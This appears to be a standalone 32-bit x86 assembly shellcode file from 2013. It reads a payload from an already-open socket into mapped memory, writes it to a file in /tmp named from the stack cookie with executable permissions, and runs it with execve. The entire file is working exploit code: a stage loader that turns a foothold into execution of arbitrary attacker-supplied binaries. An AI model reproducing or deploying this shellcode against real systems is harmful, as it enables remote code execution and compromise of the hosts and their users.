	;; Evan Jensen 32bit Put a file in /tmp and execve it shellcode
	;; Paolo Soto
	;; Sat Mar  9 05:39:07 EST 2013

	;; %eax = syscall number
	;; args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
BITS 32
	global main
	
	%include "short32.s"

	%define openflags 0x42 ; O_CREAT|O_RDWR
	%define size 0xffff
	%define stackcookie [gs:0x14]

	; assumption - ebx has the input (socket)
		
main:
	; ebx = 0
	; ecx = size
	; edx = 0x3
	; esi = 0x2
	; edi = eax
	; ebp = 0

	; mmap(0, 1M, PROT_READ|PROT_WRITE, MAP_PRIVATE, input_fd, 0)
	mov edi, ebx            ; edi = input
	xor ecx, ecx
	mov cl, 0x1
	shl ecx, 22		; ecx = 4M 
	xor ebx, ebx 		; ebp = 0
	mov bl, 0x2
	mov si, bx              ; esi = 0x2
	xor ebp, ebp 		; ebp = 0
	mov ebx, ebp 		; ebx = 0
	mov edx, ebp  		
	mov dl, 0x3 		; edx = 3
	mov al, mmap
	int 0x80 		; call mmap

	; (temp assignment)
	mov esi, ecx            ; esi = size
	mov edi, eax            ; edi = buffer (temp assignment)

	; open(filename, O_CREAT|O_RDWR, 0700
	xor eax, eax 
	push eax
	push dword stackcookie  ; use the stack cookie as a file name 
	push 0x706d742f		; stack = /tmp/filename\0
	mov ebx, esp            ; ebx = stack
	mov ecx, eax
	mov cl, 0x42 		; ecx = O_CREAT|O_RDWR
	mov edx, eax	
	mov dl, 0x7
	shl dl, 0x6		; edx = 111000000 = 0700
	mov al, open 
	int 0x80 		; call open 

	; write(output, buffer, size)
	mov ebx, eax 		; ebx = output
	mov ecx, edi 		; ecx = buffer
	mov edx, esi 		; edx = size
	xor eax, eax
	mov al, write
	int 0x80 		; call write 
	
	; execve(filename, 0, 0) 
	mov ebx, esp 		; ebx = filename
	xor ecx, ecx
	mov edx, ecx
	mov eax, ecx
	mov al, execve
	int 0x80

